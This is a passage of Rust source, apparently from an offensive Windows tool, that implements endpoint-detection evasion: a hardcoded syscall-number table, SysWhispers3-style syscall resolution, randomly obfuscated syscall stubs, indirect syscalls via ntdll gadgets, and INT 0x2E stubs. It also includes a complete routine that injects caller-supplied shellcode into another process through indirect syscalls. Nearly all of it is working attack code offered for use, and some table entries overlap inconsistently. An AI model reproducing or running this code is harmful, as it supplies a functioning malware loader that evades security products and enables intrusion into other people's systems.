    *ptr.add(0) == 0x4C  // mov r10, rcx
    && *ptr.add(1) == 0x8B
    && *ptr.add(2) == 0xD1
    && *ptr.add(3) == 0xB8  // mov eax, imm32
    && *ptr.add(6) == 0x00  // SSN should be < 0x10000
    && *ptr.add(7) == 0x00
}

// ===== Syscall Version Database =====
// Hardcoded SSN table for common Nt* functions across Windows builds.
// Used as last-resort fallback when both in-memory and disk ntdll are unavailable/hooked.
// Sources: j00ru/windows-syscalls, SysWhispers3 tables.

struct SyscallEntry {
    name: &'static str,
    // (build_number_min, build_number_max, ssn)
    versions: &'static [(u32, u32, u32)],
}

static SYSCALL_DB: &[SyscallEntry] = &[
    SyscallEntry {
        name: "NtAllocateVirtualMemory",
        versions: &[
            (10240, 10240, 0x0018), // Win10 1507
            (10586, 10586, 0x0018), // Win10 1511
            (14393, 14393, 0x0018), // Win10 1607
            (15063, 15063, 0x0018), // Win10 1703
            (16299, 16299, 0x0018), // Win10 1709
            (17134, 17134, 0x0018), // Win10 1803
            (17763, 17763, 0x0018), // Win10 1809
            (18362, 18363, 0x0018), // Win10 1903/1909
            (19041, 19045, 0x0018), // Win10 2004-22H2
            (22000, 22631, 0x0018), // Win11 21H2-23H2
            (26100, 26100, 0x0018), // Win11 24H2
        ],
    },
    SyscallEntry {
        name: "NtWriteVirtualMemory",
        versions: &[
            (10240, 10240, 0x003A), // Win10 1507
            (10586, 10586, 0x003A), // Win10 1511
            (14393, 14393, 0x003A), // Win10 1607
            (15063, 15063, 0x003A), // Win10 1703
            (16299, 16299, 0x003A), // Win10 1709
            (17134, 17134, 0x003A), // Win10 1803
            (17763, 17763, 0x003A), // Win10 1809
            (18362, 18363, 0x003A), // Win10 1903/1909
            (19041, 19045, 0x003A), // Win10 2004-22H2
            (22000, 22631, 0x003A), // Win11 21H2-23H2
            (26100, 26100, 0x003A), // Win11 24H2
        ],
    },
    SyscallEntry {
        name: "NtProtectVirtualMemory",
        versions: &[
            (10240, 10240, 0x0050), // Win10 1507
            (10586, 10586, 0x0050), // Win10 1511
            (14393, 14393, 0x0050), // Win10 1607
            (15063, 15063, 0x0050), // Win10 1703
            (16299, 16299, 0x0050), // Win10 1709
            (17134, 17134, 0x0050), // Win10 1803
            (17763, 17763, 0x0050), // Win10 1809
            (18362, 18363, 0x0050), // Win10 1903/1909
            (19041, 19045, 0x0050), // Win10 2004-22H2
            (22000, 22631, 0x0050), // Win11 21H2-23H2
            (26100, 26100, 0x0050), // Win11 24H2
        ],
    },
    SyscallEntry {
        name: "NtCreateThreadEx",
        versions: &[
            (10240, 10240, 0x00B3),
            (10586, 10586, 0x00B4),
            (14393, 14393, 0x00B6),
            (15063, 15063, 0x00B9),
            (16299, 16299, 0x00BA),
            (17134, 17134, 0x00BB),
            (17763, 17763, 0x00BC),
            (18362, 18363, 0x00BD),
            (19041, 19045, 0x00C1),
            (22000, 22631, 0x00C2),
            (26100, 26100, 0x00C7),
        ],
    },
    SyscallEntry {
        name: "NtReadVirtualMemory",
        versions: &[
            (10240, 26100, 0x003F), // Stable across all Win10/11
        ],
    },
    SyscallEntry {
        name: "NtOpenProcess",
        versions: &[
            (10240, 10240, 0x0026),
            (10586, 10586, 0x0026),
            (14393, 14393, 0x0026),
            (15063, 15063, 0x0026),
            (16299, 16299, 0x0026),
            (17134, 17134, 0x0026),
            (17763, 17763, 0x0026),
            (18362, 18363, 0x0026),
            (19041, 19045, 0x0026),
            (22000, 22631, 0x0026),
            (26100, 26100, 0x0026),
        ],
    },
    SyscallEntry {
        name: "NtClose",
        versions: &[
            (10240, 26100, 0x000F), // Stable
        ],
    },
    SyscallEntry {
        name: "NtQuerySystemInformation",
        versions: &[
            (10240, 26100, 0x0036), // Stable
        ],
    },
    SyscallEntry {
        name: "NtQueryInformationProcess",
        versions: &[
            (10240, 26100, 0x0019), // Stable
        ],
    },
    SyscallEntry {
        name: "NtFreeVirtualMemory",
        versions: &[
            (10240, 26100, 0x001E), // Stable
        ],
    },
    SyscallEntry {
        name: "NtCreateSection",
        versions: &[
            (10240, 26100, 0x004A), // Stable
        ],
    },
    SyscallEntry {
        name: "NtMapViewOfSection",
        versions: &[
            (10240, 26100, 0x0028), // Stable
        ],
    },
    SyscallEntry {
        name: "NtUnmapViewOfSection",
        versions: &[
            (10240, 26100, 0x002A), // Stable
        ],
    },
    SyscallEntry {
        name: "NtQueueApcThread",
        versions: &[
            (10240, 26100, 0x0045), // Stable
        ],
    },
    SyscallEntry {
        name: "NtResumeThread",
        versions: &[
            (10240, 26100, 0x0052), // Stable
        ],
    },
    SyscallEntry {
        name: "NtSuspendThread",
        versions: &[
            (10240, 26100, 0x0171), // Relatively stable (varies slightly)
            (19041, 19045, 0x0175),
            (22000, 26100, 0x0177),
        ],
    },
    SyscallEntry {
        name: "NtSetContextThread",
        versions: &[
            (10240, 26100, 0x018B),
            (19041, 19045, 0x018E),
            (22000, 26100, 0x0193),
        ],
    },
    SyscallEntry {
        name: "NtGetContextThread",
        versions: &[
            (10240, 26100, 0x00F2),
            (19041, 19045, 0x00F5),
            (22000, 26100, 0x00F8),
        ],
    },
    SyscallEntry {
        name: "NtOpenProcessToken",
        versions: &[
            (10240, 26100, 0x0129),
            (19041, 19045, 0x012C),
            (22000, 26100, 0x012F),
        ],
    },
    SyscallEntry {
        name: "NtDuplicateToken",
        versions: &[
            (10240, 26100, 0x0042), // Stable
        ],
    },
    SyscallEntry {
        name: "NtAdjustPrivilegesToken",
        versions: &[
            (10240, 26100, 0x0041), // Stable
        ],
    },
];

fn get_windows_build_number() -> u32 {
    use windows::Win32::System::SystemInformation::{GetVersionExW, OSVERSIONINFOW};
    unsafe {
        let mut info: OSVERSIONINFOW = std::mem::zeroed();
        info.dwOSVersionInfoSize = std::mem::size_of::<OSVERSIONINFOW>() as u32;
        let _ = GetVersionExW(&mut info);
        info.dwBuildNumber
    }
}

/// Lookup syscall number from static version database — last-resort fallback
/// when both in-memory ntdll and disk ntdll are unavailable/hooked.
pub fn syscall_version_lookup(args: &Value) -> Result<Value, MemoricError> {
    let function = args
        .get("function")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::WindowsApi("Missing function name".to_string()))?;
    let build_override = args
        .get("build_number")
        .and_then(|v| v.as_u64())
        .map(|v| v as u32);

    let build = build_override.unwrap_or_else(get_windows_build_number);

    tracing::info!(
        "[EVASION] Syscall version DB lookup: {} on build {}",
        function,
        build
    );

    for entry in SYSCALL_DB.iter() {
        if entry.name == function {
            for &(min_build, max_build, ssn) in entry.versions.iter() {
                if build >= min_build && build <= max_build {
                    return Ok(serde_json::json!({
                        "success": true,
                        "function": function,
                        "ssn": ssn,
                        "build_number": build,
                        "method": "version_database",
                        "message": format!("SSN={:#06X} for {} on build {}", ssn, function, build)
                    }));
                }
            }
            return Err(MemoricError::WindowsApi(format!(
                "No SSN mapping for {} on build {} in version database",
                function, build
            )));
        }
    }

    Err(MemoricError::WindowsApi(format!(
        "{} not found in syscall version database. Available: {}",
        function,
        SYSCALL_DB
            .iter()
            .map(|e| e.name)
            .collect::<Vec<_>>()
            .join(", ")
    )))
}

/// List all functions in the syscall version database with their SSN for the current build
pub fn syscall_db_dump(args: &Value) -> Result<Value, MemoricError> {
    let build_override = args
        .get("build_number")
        .and_then(|v| v.as_u64())
        .map(|v| v as u32);
    let build = build_override.unwrap_or_else(get_windows_build_number);

    tracing::info!("[EVASION] Dumping syscall version DB for build {}", build);

    let mut entries = Vec::new();
    for entry in SYSCALL_DB.iter() {
        let mut ssn_found = None;
        for &(min_build, max_build, ssn) in entry.versions.iter() {
            if build >= min_build && build <= max_build {
                ssn_found = Some(ssn);
                break;
            }
        }
        entries.push(serde_json::json!({
            "function": entry.name,
            "ssn": ssn_found,
            "available": ssn_found.is_some()
        }));
    }

    Ok(serde_json::json!({
        "success": true,
        "build_number": build,
        "total_functions": SYSCALL_DB.len(),
        "entries": entries,
        "message": format!("Syscall DB: {} functions for build {}", SYSCALL_DB.len(), build)
    }))
}

/// Cached SSN resolution with configurable TTL
pub fn ssn_cache(args: &Value) -> Result<Value, MemoricError> {
    use std::sync::Mutex;

    static SSN_CACHE: once_cell::sync::Lazy<
        Mutex<std::collections::HashMap<String, (u32, std::time::Instant)>>,
    > = once_cell::sync::Lazy::new(|| Mutex::new(std::collections::HashMap::new()));

    let function = args.get("function").and_then(|v| v.as_str()).unwrap_or("");
    let ttl_secs = args.get("ttl_secs").and_then(|v| v.as_u64()).unwrap_or(300);
    let action = args
        .get("action")
        .and_then(|v| v.as_str())
        .unwrap_or("resolve");

    match action {
        "flush" => {
            if let Ok(mut cache) = SSN_CACHE.lock() {
                let count = cache.len();
                cache.clear();
                return Ok(serde_json::json!({
                    "success": true,
                    "action": "flush",
                    "entries_cleared": count
                }));
            }
            return Err(MemoricError::WindowsApi("Cache lock failed".to_string()));
        }
        "dump" => {
            if let Ok(cache) = SSN_CACHE.lock() {
                let entries: Vec<Value> = cache
                    .iter()
                    .map(|(name, (ssn, time))| {
                        serde_json::json!({
                            "function": name,
                            "ssn": ssn,
                            "age_secs": time.elapsed().as_secs()
                        })
                    })
                    .collect();
                return Ok(serde_json::json!({
                    "success": true,
                    "action": "dump",
                    "cache_size": entries.len(),
                    "entries": entries
                }));
            }
            return Err(MemoricError::WindowsApi("Cache lock failed".to_string()));
        }
        "resolve" | _ => {
            if function.is_empty() {
                return Err(MemoricError::WindowsApi(
                    "Missing function name".to_string(),
                ));
            }

            // Check cache first
            if let Ok(cache) = SSN_CACHE.lock() {
                if let Some((ssn, time)) = cache.get(function) {
                    if time.elapsed().as_secs() < ttl_secs {
                        return Ok(serde_json::json!({
                            "success": true,
                            "function": function,
                            "ssn": ssn,
                            "cached": true,
                            "cache_age_secs": time.elapsed().as_secs(),
                            "cache_size": cache.len()
                        }));
                    }
                }
            }

            // Resolve via existing mechanism
            let resolve_args = serde_json::json!({"function": function});
            let result = resolve_syscall_number(&resolve_args)?;
            let ssn = result.get("ssn").and_then(|v| v.as_u64()).unwrap_or(0) as u32;

            // Store in cache
            if let Ok(mut cache) = SSN_CACHE.lock() {
                cache.insert(function.to_string(), (ssn, std::time::Instant::now()));
            }

            Ok(serde_json::json!({
                "success": true,
                "function": function,
                "ssn": ssn,
                "cached": false,
                "cache_age_secs": 0,
                "cache_size": SSN_CACHE.lock().map(|c| c.len()).unwrap_or(0)
            }))
        }
    }
}

/// Generate randomized/obfuscated syscall stub (resists signature detection)
pub fn obfuscated_syscall_stub(args: &Value) -> Result<Value, MemoricError> {
    let function = args
        .get("function")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::WindowsApi("Missing function".to_string()))?;
    let junk_density = args
        .get("junk_density")
        .and_then(|v| v.as_f64())
        .unwrap_or(0.3);

    tracing::warn!(
        "[EVASION] obfuscated_syscall_stub: {} junk_density={}",
        function,
        junk_density
    );

    // Resolve SSN
    let resolve_args = serde_json::json!({"function": function});
    let result = resolve_syscall_number(&resolve_args)?;
    let ssn = result.get("ssn").and_then(|v| v.as_u64()).unwrap_or(0) as u32;

    if ssn == 0 {
        return Err(MemoricError::WindowsApi(format!(
            "Could not resolve SSN for {}",
            function
        )));
    }

    let mut stub = Vec::new();
    let mut seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64;

    // Helper: generate junk instruction
    let maybe_junk = |s: &mut Vec<u8>, seed: &mut u64| {
        *seed ^= *seed << 13;
        *seed ^= *seed >> 7;
        *seed ^= *seed << 17;
        if (*seed as f64 / u64::MAX as f64) < junk_density {
            match *seed % 5 {
                0 => s.extend_from_slice(&[0x90]),                   // nop
                1 => s.extend_from_slice(&[0x48, 0x87, 0xDB]),       // xchg rbx, rbx
                2 => s.extend_from_slice(&[0x66, 0x90]),             // 2-byte nop
                3 => s.extend_from_slice(&[0x48, 0x8D, 0x24, 0x24]), // lea rsp,[rsp]
                _ => s.extend_from_slice(&[0x53, 0x5B]),             // push rbx; pop rbx
            }
        }
    };

    maybe_junk(&mut stub, &mut seed);

    // mov r10, rcx — use alternative encoding based on seed
    seed ^= seed << 13;
    seed ^= seed >> 7;
    seed ^= seed << 17;
    if seed % 2 == 0 {
        // Standard: mov r10, rcx
        stub.extend_from_slice(&[0x49, 0x89, 0xCA]);
    } else {
        // Alternative: push rcx; pop r10
        stub.extend_from_slice(&[0x51, 0x41, 0x5A]);
    }

    maybe_junk(&mut stub, &mut seed);

    // mov eax, SSN — use alternative encoding
    seed ^= seed << 13;
    seed ^= seed >> 7;
    seed ^= seed << 17;
    if seed % 3 == 0 {
        // Standard: mov eax, imm32
        stub.push(0xB8);
        stub.extend_from_slice(&ssn.to_le_bytes());
    } else if seed % 3 == 1 {
        // push imm32; pop rax
        stub.push(0x68);
        stub.extend_from_slice(&ssn.to_le_bytes());
        stub.push(0x58); // pop rax
    } else {
        // xor eax, eax; add eax, SSN
        stub.extend_from_slice(&[0x31, 0xC0]); // xor eax, eax
        stub.push(0x05); // add eax, imm32
        stub.extend_from_slice(&ssn.to_le_bytes());
    }

    maybe_junk(&mut stub, &mut seed);

    // syscall
    stub.extend_from_slice(&[0x0F, 0x05]);
    // ret
    stub.push(0xC3);

    maybe_junk(&mut stub, &mut seed);

    let hex_output: String = stub.iter().map(|b| format!("{:02X}", b)).collect();

    Ok(serde_json::json!({
        "success": true,
        "technique": "obfuscated_syscall_stub",
        "function": function,
        "ssn": ssn,
        "stub_bytes": stub,
        "stub_hex": hex_output,
        "stub_size": stub.len(),
        "junk_density": junk_density,
        "message": format!("Generated {}B obfuscated stub for {} (SSN={})", stub.len(), function, ssn)
    }))
}

// ===== SysWhispers3-style Zw* sort-based SSN resolution =====
// Enumerates ALL Zw* exports from ntdll, sorts by address.
// SSN = sort index. Works even when ALL stubs are hooked because it only
// needs export addresses, not stub bytes.

/// SysWhispers3-style SSN resolution via Zw* export sorting
/// This is the most reliable technique when EDRs hook all Nt* stubs
pub fn syswhispers3_resolve(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::LibraryLoader::GetModuleHandleA;

    let function = args
        .get("function")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::WindowsApi("Missing function name".to_string()))?;

    // Convert Nt* to Zw* for lookup (they share SSNs)
    let zw_name = if function.starts_with("Nt") {
        format!("Zw{}", &function[2..])
    } else if function.starts_with("Zw") {
        function.to_string()
    } else {
        return Err(MemoricError::WindowsApi(format!(
            "{} is not an Nt*/Zw* function",
            function
        )));
    };

    tracing::info!(
        "[EVASION] SysWhispers3 SSN resolution for {} (as {})",
        function,
        zw_name
    );

    unsafe {
        let ntdll = GetModuleHandleA(windows::core::PCSTR(b"ntdll.dll\0".as_ptr()))
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to get ntdll: {}", e)))?;

        let base = ntdll.0 as *const u8;
        let e_lfanew = *(base.add(0x3C) as *const u32) as usize;
        let nt_headers = base.add(e_lfanew);
        let optional = nt_headers.add(24);
        let export_dir_rva = *(optional.add(112) as *const u32) as usize;
        if export_dir_rva == 0 {
            return Err(MemoricError::WindowsApi("No export directory".to_string()));
        }

        let export_dir = base.add(export_dir_rva);
        let num_names = *(export_dir.add(24) as *const u32);
        let names_rva = *(export_dir.add(32) as *const u32) as usize;
        let ordinals_rva = *(export_dir.add(36) as *const u32) as usize;
        let functions_rva = *(export_dir.add(28) as *const u32) as usize;

        let names = base.add(names_rva) as *const u32;
        let ordinals = base.add(ordinals_rva) as *const u16;
        let functions = base.add(functions_rva) as *const u32;

        // Collect all Zw* exports with their addresses
        let mut zw_exports: Vec<(String, usize)> = Vec::new();

        for i in 0..num_names {
            let name_rva = *names.add(i as usize);
            let name_ptr = base.add(name_rva as usize);
            let name = std::ffi::CStr::from_ptr(name_ptr as *const i8);
            if let Ok(name_str) = name.to_str() {
                if name_str.starts_with("Zw") {
                    let ordinal = *ordinals.add(i as usize);
                    let func_rva = *functions.add(ordinal as usize) as usize;
                    zw_exports.push((name_str.to_string(), func_rva));
                }
            }
        }

        // Sort by address — the sort index IS the SSN
        zw_exports.sort_by_key(|&(_, addr)| addr);

        let total = zw_exports.len();

        // Find our target
        for (ssn, (name, _addr)) in zw_exports.iter().enumerate() {
            if *name == zw_name {
                return Ok(serde_json::json!({
                    "success": true,
                    "function": function,
                    "zw_name": zw_name,
                    "ssn": ssn,
                    "ssn_hex": format!("0x{:04X}", ssn),
                    "method": "syswhispers3",
                    "total_syscalls": total,
                    "message": format!("{} SSN={} (0x{:04X}) via SysWhispers3 Zw* sort ({} total syscalls)", function, ssn, ssn, total)
                }));
            }
        }

        Err(MemoricError::WindowsApi(format!(
            "{} (as {}) not found in ntdll Zw* exports",
            function, zw_name
        )))
    }
}

// ===== Indirect syscall protect =====

/// Indirect syscall protect — NtProtectVirtualMemory via JMP to ntdll gadget
pub fn indirect_syscall_protect(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_VM_OPERATION};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing pid".to_string()))?;
    let address = args
        .get("address")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::MemoryAccess("Missing address".to_string()))?;
    let size = args
        .get("size")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing size".to_string()))?
        as usize;
    let protection = args
        .get("protection")
        .and_then(|v| v.as_u64())
        .unwrap_or(0x20) as u32; // PAGE_EXECUTE_READ

    let ssn = resolve_ssn("NtProtectVirtualMemory")?;
    let gadget = find_syscall_ret_gadget()?;

    unsafe {
        let handle = OpenProcess(PROCESS_VM_OPERATION, false, pid as u32)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);

        let stub = build_indirect_syscall_stub(ssn, gadget)?;

        type NtProtectVirtualMemoryFn = unsafe extern "system" fn(
            isize,
            *mut *mut std::ffi::c_void,
            *mut usize,
            u32,
            *mut u32,
        ) -> i32;

        let syscall_fn: NtProtectVirtualMemoryFn = std::mem::transmute(stub);
        let mut base = address as *mut std::ffi::c_void;
        let mut region_size = size;
        let mut old_protect = 0u32;

        let status = syscall_fn(
            handle.raw().0 as isize,
            &mut base,
            &mut region_size,
            protection,
            &mut old_protect,
        );

        if status < 0 {
            return Err(MemoricError::WindowsApi(format!(
                "Indirect NtProtectVirtualMemory failed: 0x{:08X}",
                status as u32
            )));
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "indirect_syscall",
            "ssn": ssn,
            "gadget_address": format!("0x{:016X}", gadget),
            "address": format!("0x{:016X}", address),
            "size": region_size,
            "new_protection": format!("0x{:X}", protection),
            "old_protection": format!("0x{:X}", old_protect),
            "message": "Memory protection changed via indirect syscall"
        }))
    }
}

// ===== Indirect syscall create thread =====

/// Indirect syscall NtCreateThreadEx — thread creation via JMP to ntdll gadget
pub fn indirect_syscall_create_thread(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let start_address = args
        .get("start_address")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::InjectionFailed("Missing start_address".to_string()))?;

    let ssn = resolve_ssn("NtCreateThreadEx")?;
    let gadget = find_syscall_ret_gadget()?;

    unsafe {
        let handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid as u32)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);

        let stub = build_indirect_syscall_stub(ssn, gadget)?;

        type NtCreateThreadExFn = unsafe extern "system" fn(
            *mut isize,
            u32,
            *mut std::ffi::c_void,
            isize,
            *mut std::ffi::c_void,
            *mut std::ffi::c_void,
            u32,
            usize,
            usize,
            usize,
            *mut std::ffi::c_void,
        ) -> i32;

        let syscall_fn: NtCreateThreadExFn = std::mem::transmute(stub);
        let mut thread_handle: isize = 0;

        let status = syscall_fn(
            &mut thread_handle,
            0x1FFFFF,
            std::ptr::null_mut(),
            handle.raw().0 as isize,
            start_address as *mut _,
            std::ptr::null_mut(),
            0,
            0,
            0,
            0,
            std::ptr::null_mut(),
        );

        if status < 0 {
            return Err(MemoricError::InjectionFailed(format!(
                "Indirect NtCreateThreadEx failed: 0x{:08X}",
                status as u32
            )));
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "indirect_syscall",
            "ssn": ssn,
            "gadget_address": format!("0x{:016X}", gadget),
            "thread_handle": thread_handle,
            "message": "Thread created via indirect syscall (bypasses all usermode hooks)"
        }))
    }
}

// ===== Full indirect syscall injection chain =====

/// Full injection chain via indirect syscalls only — alloc → write → protect → execute
/// Zero calls to hooked Win32 APIs (except OpenProcess)
pub fn indirect_syscall_inject(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let shellcode_hex = args
        .get("shellcode")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing shellcode (hex)".to_string()))?;

    let shellcode: Vec<u8> = (0..shellcode_hex.len())
        .step_by(2)
        .filter_map(|i| u8::from_str_radix(&shellcode_hex[i..i + 2], 16).ok())
        .collect();

    if shellcode.is_empty() {
        return Err(MemoricError::InjectionFailed("Empty shellcode".to_string()));
    }

    tracing::warn!(
        "[EVASION] Full indirect syscall injection: {} bytes into PID {}",
        shellcode.len(),
        pid
    );

    // Resolve all SSNs upfront
    let ssn_alloc = resolve_ssn("NtAllocateVirtualMemory")?;
    let ssn_write = resolve_ssn("NtWriteVirtualMemory")?;
    let ssn_protect = resolve_ssn("NtProtectVirtualMemory")?;
    let ssn_thread = resolve_ssn("NtCreateThreadEx")?;

    // Get random gadget for each operation
    let gadgets = find_all_syscall_gadgets()?;
    let gadget_count = gadgets.len();

    unsafe {
        let handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid as u32)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);
        let h = handle.raw().0 as isize;

        // Step 1: Allocate RW memory (NOT RWX — W^X pattern)
        let stub_alloc = build_indirect_syscall_stub(ssn_alloc, pick_random_gadget(&gadgets))?;
        type NtAllocFn = unsafe extern "system" fn(
            isize,
            *mut *mut std::ffi::c_void,
            usize,
            *mut usize,
            u32,
            u32,
        ) -> i32;
        let alloc_fn: NtAllocFn = std::mem::transmute(stub_alloc);
        let mut base_addr: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut region_size = shellcode.len();
        let status = alloc_fn(h, &mut base_addr, 0, &mut region_size, 0x3000, 0x04); // PAGE_READWRITE
        if status < 0 {
            return Err(MemoricError::InjectionFailed(format!(
                "Indirect NtAllocateVirtualMemory failed: 0x{:08X}",
                status as u32
            )));
        }

        // Step 2: Write shellcode
        let stub_write = build_indirect_syscall_stub(ssn_write, pick_random_gadget(&gadgets))?;
        type NtWriteFn = unsafe extern "system" fn(
            isize,
            *mut std::ffi::c_void,
            *const std::ffi::c_void,
            usize,
            *mut usize,
        ) -> i32;
        let write_fn: NtWriteFn = std::mem::transmute(stub_write);
        let mut bytes_written = 0usize;
        let status = write_fn(
            h,
            base_addr,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            &mut bytes_written,
        );
        if status < 0 {
            return Err(MemoricError::InjectionFailed(format!(
                "Indirect NtWriteVirtualMemory failed: 0x{:08X}",
                status as u32
            )));
        }

        // Step 3: Change to RX (W^X transition)
        let stub_protect = build_indirect_syscall_stub(ssn_protect, pick_random_gadget(&gadgets))?;
        type NtProtectFn = unsafe extern "system" fn(
            isize,
            *mut *mut std::ffi::c_void,
            *mut usize,
            u32,
            *mut u32,
        ) -> i32;
        let protect_fn: NtProtectFn = std::mem::transmute(stub_protect);
        let mut prot_base = base_addr;
        let mut prot_size = shellcode.len();
        let mut old_prot = 0u32;
        let status = protect_fn(h, &mut prot_base, &mut prot_size, 0x20, &mut old_prot); // PAGE_EXECUTE_READ
        if status < 0 {
            return Err(MemoricError::InjectionFailed(format!(
                "Indirect NtProtectVirtualMemory failed: 0x{:08X}",
                status as u32
            )));
        }

        // Step 4: Create remote thread
        let stub_thread = build_indirect_syscall_stub(ssn_thread, pick_random_gadget(&gadgets))?;
        type NtCreateThreadExFn = unsafe extern "system" fn(
            *mut isize,
            u32,
            *mut std::ffi::c_void,
            isize,
            *mut std::ffi::c_void,
            *mut std::ffi::c_void,
            u32,
            usize,
            usize,
            usize,
            *mut std::ffi::c_void,
        ) -> i32;
        let thread_fn: NtCreateThreadExFn = std::mem::transmute(stub_thread);
        let mut thread_handle: isize = 0;
        let status = thread_fn(
            &mut thread_handle,
            0x1FFFFF,
            std::ptr::null_mut(),
            h,
            base_addr,
            std::ptr::null_mut(),
            0,
            0,
            0,
            0,
            std::ptr::null_mut(),
        );
        if status < 0 {
            return Err(MemoricError::InjectionFailed(format!(
                "Indirect NtCreateThreadEx failed: 0x{:08X}",
                status as u32
            )));
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "full_indirect_syscall_injection",
            "pid": pid,
            "address": format!("0x{:016X}", base_addr as usize),
            "shellcode_size": shellcode.len(),
            "bytes_written": bytes_written,
            "thread_handle": thread_handle,
            "ssns": {
                "NtAllocateVirtualMemory": ssn_alloc,
                "NtWriteVirtualMemory": ssn_write,
                "NtProtectVirtualMemory": ssn_protect,
                "NtCreateThreadEx": ssn_thread
            },
            "gadgets_available": gadget_count,
            "w_x_pattern": true,
            "message": format!("Injected {} bytes via full indirect syscall chain (W^X, {} gadgets rotated)", shellcode.len(), gadget_count)
        }))
    }
}

// ===== Random gadget collection & selection =====

/// Find ALL syscall;ret gadgets in ntdll .text section (not just the first one)
fn find_all_syscall_gadgets() -> Result<Vec<usize>, MemoricError> {
    use windows::Win32::System::LibraryLoader::GetModuleHandleA;

    unsafe {
        let ntdll = GetModuleHandleA(windows::core::PCSTR(b"ntdll.dll\0".as_ptr()))
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to get ntdll: {}", e)))?;

        let base = ntdll.0 as *const u8;
        let e_lfanew = *(base.add(0x3C) as *const u32) as usize;
        let nt_headers = base.add(e_lfanew);
        let optional = nt_headers.add(24);
        let num_sections = *(nt_headers.add(6) as *const u16);
        let section_header = optional.add(240);

        for i in 0..num_sections {
            let section = section_header.add(i as usize * 40);
            let name = std::slice::from_raw_parts(section, 8);
            if &name[0..5] == b".text" {
                let rva = *(section.add(12) as *const u32) as usize;
                let size = *(section.add(8) as *const u32) as usize;
                let text_start = base.add(rva);

                let mut gadgets = Vec::new();
                for j in 0..size.saturating_sub(2) {
                    // 0F 05 C3 = syscall; ret
                    if *text_start.add(j) == 0x0F
                        && *text_start.add(j + 1) == 0x05
                        && *text_start.add(j + 2) == 0xC3
                    {
                        gadgets.push(text_start.add(j) as usize);
                    }
                }

                if gadgets.is_empty() {
                    return Err(MemoricError::WindowsApi(
                        "No syscall;ret gadgets found in ntdll".to_string(),
                    ));
                }

                tracing::info!(
                    "[EVASION] Found {} syscall;ret gadgets in ntdll .text",
                    gadgets.len()
                );
                return Ok(gadgets);
            }
        }

        Err(MemoricError::WindowsApi(
            ".text section not found in ntdll".to_string(),
        ))
    }
}

/// Pick a random gadget from the collection (varies return address per operation)
fn pick_random_gadget(gadgets: &[usize]) -> usize {
    let seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as usize;
    gadgets[seed % gadgets.len()]
}

// ===== Int 2E stub — alternative syscall gate =====

/// Build syscall stub using INT 0x2E instead of SYSCALL (0F 05)
/// INT 2E is the legacy Windows syscall gate — still functional on x64.
/// Many EDRs only hook SYSCALL opcode and miss INT 2E.
fn build_int2e_stub(ssn: u32) -> Result<*const u8, MemoricError> {
    use windows::Win32::System::Memory::{
        VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
    };

    // mov r10, rcx
    // mov eax, <ssn>
    // int 0x2E
    // ret
    let stub: [u8; 12] = [
        0x49,
        0x89,
        0xCA, // mov r10, rcx
        0xB8, // mov eax, imm32
        (ssn & 0xFF) as u8,
        ((ssn >> 8) & 0xFF) as u8,
        ((ssn >> 16) & 0xFF) as u8,
        ((ssn >> 24) & 0xFF) as u8,
        0xCD,
        0x2E, // int 0x2E
        0xC3, // ret
        0x90, // nop padding
    ];

    unsafe {
        let mem = VirtualAlloc(None, stub.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if mem.is_null() {
            return Err(MemoricError::WindowsApi(
                "Failed to allocate stub memory".to_string(),
            ));
        }
        std::ptr::copy_nonoverlapping(stub.as_ptr(), mem as *mut u8, stub.len());

        // W^X: flip to execute-read
        let mut old = PAGE_READWRITE;
        VirtualProtect(mem, stub.len(), PAGE_EXECUTE_READ, &mut old)
            .map_err(|e| MemoricError::WindowsApi(format!("VirtualProtect failed: {}", e)))?;

        Ok(mem as *const u8)
    }
}

/// Execute a syscall via INT 0x2E gate — bypasses SYSCALL opcode hooking
pub fn syscall_int2e(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

    let op = args.get("op").and_then(|v| v.as_str()).unwrap_or("alloc");
    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing pid".to_string()))?;

